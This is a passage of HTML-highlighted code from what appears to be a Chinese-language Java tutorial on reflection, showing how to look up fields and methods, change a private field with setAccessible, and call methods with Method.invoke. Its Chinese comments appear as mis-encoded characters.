&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// è·å–ç»§æ‰¿çš„publicå­—æ®µ&amp;#34;name&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// æ ¹æ®å­—æ®µåè·å–å½“å‰ç±»çš„æŸä¸ªfield(ä¸åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grade&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// è·å–privateå­—æ®µ&amp;#34;grade&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">grade&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸€ä¸ª&lt;code>Field&lt;/code>å¯¹è±¡åŒ…å«ä¸€ä¸ªå­—æ®µçš„æ‰€æœ‰ä¿¡æ¯&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿”å›å­—æ®µåç§°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// &amp;#34;value&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿”å›å­—æ®µç±»å‹ æ˜¯ä¸€ä¸ªClasså®ä¾‹(æ¯”å¦‚String.class)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getType&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// class [B è¡¨ç¤ºbyte[]ç±»å‹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¿”å›å­—æ®µçš„ä¿®é¥°ç¬¦ æ˜¯ä¸€ä¸ªint ä¸åŒçš„bitæœ‰ä¸åŒçš„å«ä¹‰
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPublic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isProtected&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrivate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isStatic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ç”¨&lt;code>Field.get(Object)&lt;/code>å¯ä»¥è·å–æŒ‡å®šå®ä¾‹æŒ‡å®šå­—æ®µçš„å€¼ï¼›å¦‚æœå­—æ®µä¸º&lt;code>private&lt;/code>å¯ä»¥è°ƒç”¨&lt;code>Field.setAccessible(true)&lt;/code>ï¼Œä¸€å¾‹è®¿é—®ï¼Œå¯èƒ½ä¼šå¤±è´¥çš„åŸå› æ˜¯JVMè¿è¡ŒæœŸ&lt;code>SecurityManager&lt;/code>å¯èƒ½ä¸å…è®¸å¯¹&lt;code>java&lt;/code>å’Œ&lt;code>javax&lt;/code>å¼€å¤´çš„packageçš„ç±»è°ƒç”¨&lt;code>setAccessible(true)&lt;/code>ï¼Œä¿æŠ¤JVMæ ¸å¿ƒåº“çš„å®‰å…¨&lt;/li>
&lt;li>åŒæ ·çš„ï¼Œç”¨&lt;code>Field.set(Object, Object)&lt;/code>å¯ä»¥è®¾ç½®å­—æ®µçš„å€¼ï¼Œç¬¬ä¸€ä¸ª&lt;code>Object&lt;/code>å‚æ•°æ˜¯æŒ‡å®šçš„å®ä¾‹ï¼Œç¬¬äºŒä¸ª&lt;code>Object&lt;/code>å‚æ•°æ˜¯å¾…ä¿®æ”¹çš„å€¼&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Xiao Ming&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Ming&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ä¿®æ”¹épublicå­—æ®µ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Xiao Hong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Hong&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è°ƒç”¨æ–¹æ³•">è°ƒç”¨æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>ç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥è·å–æ–¹æ³•çš„ï¼ˆè¿”å›&lt;code>Method&lt;/code>å¯¹è±¡&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è·å–æŸä¸ªpublicçš„Method(åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getScore&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// è·å–publicæ–¹æ³•getScoreï¼Œå‚æ•°ä¸ºString
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getName&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// è·å–ç»§æ‰¿çš„publicæ–¹æ³•getNameï¼Œæ— å‚æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// è·å–å½“å‰ç±»çš„æŸä¸ªMethod(ä¸åŒ…æ‹¬çˆ¶ç±»)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getGrade&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// è·å–privateæ–¹æ³•getGradeï¼Œå‚æ•°ä¸ºint
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getScore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getGrade&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">year&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Person&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸€ä¸ª&lt;code>Method&lt;/code>å¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå‡½æ•°åŸºæœ¬åŒä¸Šä¸€ä¸ªä¸‰çº§æ ‡é¢˜&lt;/li>
&lt;li>å¾—åˆ°&lt;code>Method&lt;/code>åæˆ‘ä»¬å¯ä»¥å¯¹ä»–è¿›è¡Œè°ƒç”¨ï¼Œæ–¹å¼æ˜¯è°ƒç”¨å…¶&lt;code>invoke&lt;/code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡å®ä¾‹ï¼Œåé¢ä¸ºå¯å˜å‚æ•°ï¼Œä¸æ–¹æ³•å‚æ•°ä¸€è‡´&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// Stringå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;substring&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è·å–String substring(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">6&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨
